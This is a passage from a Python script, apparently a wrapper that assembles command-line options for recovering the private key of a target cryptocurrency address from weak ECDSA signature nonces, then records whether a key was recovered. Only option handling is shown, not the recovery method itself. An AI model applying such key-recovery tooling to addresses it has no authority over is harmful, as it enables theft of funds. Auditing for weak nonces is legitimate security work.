        "--segmented-relation-min-sigs", str(max(2, int(args.segmented_relation_min_sigs))),
        "--segmented-relation-max-signers", str(max(1, int(args.segmented_relation_max_signers))),
        "--segmented-relation-max-segments", str(max(1, int(args.segmented_relation_max_segments))),
        "--segmented-relation-max-rows", str(max(2, int(args.segmented_relation_max_rows))),
        "--segmented-relation-max-pairs", str(max(1, int(args.segmented_relation_max_pairs))),
        "--segmented-relation-height-window", str(max(1, int(args.segmented_relation_height_window))),
        "--segmented-relation-time-window-sec", str(max(1, int(args.segmented_relation_time_window_sec))),
        "--enable-advanced-recover",
    ]
    if args.enable_segmented_relation:
        cmd.append("--enable-segmented-relation")
    else:
        cmd.append("--no-enable-segmented-relation")
    if str(args.preload_priv_candidates or "").strip():
        cmd += ["--preload-priv-candidates", str(args.preload_priv_candidates).strip()]
    if str(args.preload_recovered_json or "").strip():
        cmd += ["--preload-recovered-json", str(args.preload_recovered_json).strip()]
    if args.relation_all_signers:
        cmd.append("--no-suspicious-signer-relation-audit-only")
    if args.enable_nonce_hypotheses:
        cmd.append("--enable-nonce-hypotheses")
        if str(args.nonce_hypothesis_models or "").strip():
            cmd += ["--nonce-hypothesis-models", str(args.nonce_hypothesis_models).strip()]
        cmd += [
            "--nonce-time-window-sec", str(max(0, int(args.nonce_time_window_sec))),
            "--nonce-time-step-sec", str(max(1, int(args.nonce_time_step_sec))),
            "--nonce-counter-max", str(max(0, int(args.nonce_counter_max))),
            "--nonce-small-k-start", str(max(1, int(args.nonce_small_k_start))),
            "--nonce-small-k-end", str(max(0, int(args.nonce_small_k_end))),
            "--nonce-max-candidates", str(max(1, int(args.nonce_max_candidates))),
        ]
    if args.exhaustive_recover:
        cmd.append("--exhaustive-recover")
    rc = run_cmd(cmd, dry_run=bool(args.dry_run))
    summary = {
        "address": args.address,
        "out_dir": str(out_dir),
        "signatures": int(collect_report.get("signature_rows", 0)),
        "automate_recover_rc": rc,
        "secret_material": "LOCAL_ARTIFACT_ONLY",
    }
    try:
        decision_path = out_dir / "automate_decision.json"
        if decision_path.exists():
            decision = json.loads(decision_path.read_text(encoding="utf-8"))
            for key in ("risk_score", "risk_verdict", "recover_executed", "key_recovered", "recover_input"):
                if key in decision:
                    summary[key] = decision[key]
    except Exception as e:
        summary["decision_read_error"] = str(e)
    (out_dir / "target_address_recovery_summary.json").write_text(json.dumps(summary, indent=2, sort_keys=True), encoding="utf-8")
    print("target address recovery complete:", f"out_dir={out_dir}", f"rc={rc}")


if __name__ == "__main__":
    main()
